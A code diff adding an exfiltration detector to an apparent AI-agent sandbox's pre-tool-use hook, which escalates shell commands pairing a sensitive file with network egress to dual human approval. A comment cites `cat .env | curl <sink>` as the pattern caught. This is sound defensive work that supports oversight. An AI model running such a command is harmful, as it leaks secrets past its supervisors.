@@ -214,6 +214,24 @@ async def pre_tool_use(payload: dict[str, Any], layout: FolderLayout) -> dict[st
         identity=identity,
         environment=getattr(policy, "environment", None),
     )
+    # Exfiltration shape: a sensitive source AND a network egress in one shell
+    # command. Deterministic; forces dual control and tells the approver why.
+    # Only ever raises scrutiny — a hard `deny` stays denied.
+    if result.trigger == "shell" and result.command and result.verdict in ("allow", "observe", "escalate"):
+        from sandbox.safety.exfil import detect as _detect_exfil
+
+        exfil = _detect_exfil(result.command)
+        if exfil is not None:
+            from sandbox.connector.risk import RiskFactor
+
+            assessment.raise_by(RiskFactor("exfiltration", 45, exfil.factor_detail()))
+            result.requires_dual = True
+            result.reason_code = "EXFIL"
+            result.reason = f"possible data exfiltration: {exfil.factor_detail()}"
+            # `cat`/`type` are allowlisted, so `cat .env | curl <sink>` would
+            # otherwise be allowed silently. Exfil always faces two humans.
+            result.verdict = "escalate"
+
     result.risk = assessment.to_dict()
 
     # Tainted folder: untrusted content recently tried to instruct the agent, so
